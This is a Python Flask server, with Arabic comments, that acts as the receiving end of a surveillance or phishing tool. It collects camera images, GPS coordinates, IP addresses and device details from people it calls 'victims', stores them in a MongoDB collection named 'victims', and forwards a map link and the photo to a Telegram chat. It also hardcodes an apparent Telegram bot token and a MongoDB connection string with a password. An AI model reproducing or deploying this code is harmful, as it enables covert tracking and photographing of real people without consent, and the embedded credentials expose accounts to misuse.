import telebot
from flask import Flask, request, jsonify
import pymongo
import base64
import os

# إعدادات البوت والقاعدة
TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk"
CHAT_ID = "8351043975"
MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/"

bot = telebot.TeleBot(TOKEN)
client = pymongo.MongoClient(MONGO_URI)
db = client.myDatabase
collection = db.victims

app = Flask(__name__)

@app.route('/receive', methods=['POST'])
def receive_data():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # 1. استخراج البيانات
    image_b64 = data.get('image')
    location = data.get('location') # يتوقع {lat: x, lon: y}
    
    # 2. حفظ في قاعدة البيانات (للسحب اللاحق من اللابتوب)
    record = {
        "ip": ip,
        "image": image_b64,
        "location": location,
        "device": request.headers.get('User-Agent')
    }
    collection.insert_one(record)

    # 3. إرسال الموقع لبوت التيليجرام
    if location:
        map_url = f"https://www.google.com/maps?q={location['lat']},{location['lon']}"
        bot.send_message(CHAT_ID, f"📍 موقع ضحية جديد!\nIP: {ip}\nالرابط: {map_url}")

    # 4. إرسال الصورة لبوت التيليجرام
    if image_b64:
        header, encoded = image_b64.split(",", 1)
        with open("temp.png", "wb") as f:
            f.write(base64.b64decode(encoded))
        with open("temp.png", "rb") as photo:
            bot.send_photo(CHAT_ID, photo, caption=f"📸 صورة الضحية من IP: {ip}")
    
    return jsonify({"status": "success"}), 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
